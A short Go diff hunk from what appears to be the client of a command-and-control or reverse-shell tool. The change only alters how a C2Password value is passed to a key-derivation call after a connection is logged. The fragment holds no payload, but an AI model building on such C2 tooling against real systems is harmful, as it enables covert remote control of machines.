@@ -36,7 +36,7 @@ func main() {
 	defer stream.Close()
 
 	slog.Info(fmt.Sprintf("Connecting to %s.", stream.RemoteAddr()))
-	key, err := grevcore.DeriveKey(stream, []byte(C2Password))
+	key, err := grevcore.DeriveKey(stream, C2Password)
 
 	if err != nil {
 		slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
